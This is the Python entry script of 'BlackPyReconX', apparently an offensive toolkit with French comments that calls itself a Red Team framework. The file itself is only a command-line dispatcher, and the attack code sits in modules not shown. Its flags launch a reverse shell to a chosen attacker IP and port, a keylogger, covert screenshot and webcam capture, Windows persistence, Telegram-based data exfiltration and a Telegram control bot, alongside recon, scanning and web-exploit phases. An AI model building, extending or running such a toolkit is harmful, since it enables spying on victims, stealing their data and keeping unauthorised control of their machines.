# main.py

import argparse
import json
import os

# 🧠 Import des modules de ton framework
from modules import osint, scanner, exploit_web, exploit_sys, reporting

# 🔧 Chargement du fichier config.json (clé API, paramètres...)
def load_config():
    if os.path.exists("config.json"):
        with open("config.json", "r") as f:
            return json.load(f)
    return {}

def main():
    parser = argparse.ArgumentParser(description="BlackPyReconX – Framework Red Team")

    # 🎯 Cible principale (IP ou domaine)
    parser.add_argument("--target",help="Cible principale (IP ou domaine)")

    # 🕵️‍♂️ Modules de reconnaissance et attaque Web
    parser.add_argument("--osint", action="store_true", help="Lancer la phase OSINT")
    parser.add_argument("--scan", action="store_true", help="Scanner les ports")
    parser.add_argument("--web", action="store_true", help="Exploits Web")
    parser.add_argument("--report", action="store_true", help="Générer le rapport final")

    # 💣 Modules post-exploitation (exploit_sys)
    parser.add_argument("--shell", action="store_true", help="Lancer reverse shell")
    parser.add_argument("--keylog", action="store_true", help="Lancer keylogger")
    parser.add_argument("--screenshot", action="store_true", help="Capturer screenshot")
    parser.add_argument("--camera", action="store_true", help="Capturer depuis webcam")

    # ⚙️ Paramètres shell personnalisables
    parser.add_argument("--attacker-ip", default="127.0.0.1", help="IP de l’attaquant pour le reverse shell")
    parser.add_argument("--port", type=int, default=4444, help="Port du reverse shell")
    parser.add_argument("--persist", action="store_true", help="Activer la persistance (Windows)")
    parser.add_argument("--clean-persist", action="store_true", help="Supprimer la persistance (registre + copie)")
    parser.add_argument("--exfil", action="store_true", help="Exfiltrer les données via Telegram")
    parser.add_argument("--bot", action="store_true", help="Démarrer le bot Telegram interactif")

    # 📥 Lecture des arguments + config
    args = parser.parse_args()
    config = load_config()

    print(f"\n[+] Cible définie : {args.target}")

    # ======================
    # PHASE 1 : OSINT
    # ======================
    if args.osint:
        print("[*] Phase OSINT en cours...")
        osint.run(args.target, config)

    # ======================
    # PHASE 2 : SCAN RÉSEAU
    # ======================
    if args.scan:
        print("[*] Phase SCAN en cours...")
        scanner.run(args.target)

    # ======================
    # PHASE 3 : EXPLOIT WEB
    # ======================
    if args.web:
        print("[*] Phase EXPLOIT WEB en cours...")
        exploit_web.run(args.target)

    # ==========================
    # PHASE 4 : RAPPORT FINAL
    # ==========================
    if args.report:
        print("[*] Génération du rapport...")
        reporting.generate_report()

    # ================================
    # PHASE 5 : POST-EXPLOITATION SYS
    # ================================
    if args.shell:
        print("[*] Lancement reverse shell...")
        exploit_sys.run(mode="shell", attacker_ip=args.attacker_ip, port=args.port)

    if args.keylog:
        print("[*] Lancement keylogger...")
        exploit_sys.run(mode="keylog")

    if args.screenshot:
        print("[*] Capture écran en cours...")
        exploit_sys.run(mode="screenshot")

    if args.camera:
        print("[*] Capture webcam en cours...")
        exploit_sys.run(mode="camera")

    if args.persist:
      from modules import persistence
      persistence.run()

    if args.clean_persist:
        from modules import persistence
        persistence.clean() 

    if args.exfil:
        from modules import exfiltration
        exfiltration.run(config)

    if args.bot:
       from modules import telegram_bot
       telegram_bot.start_bot(config)


if __name__ == "__main__":
    main()
    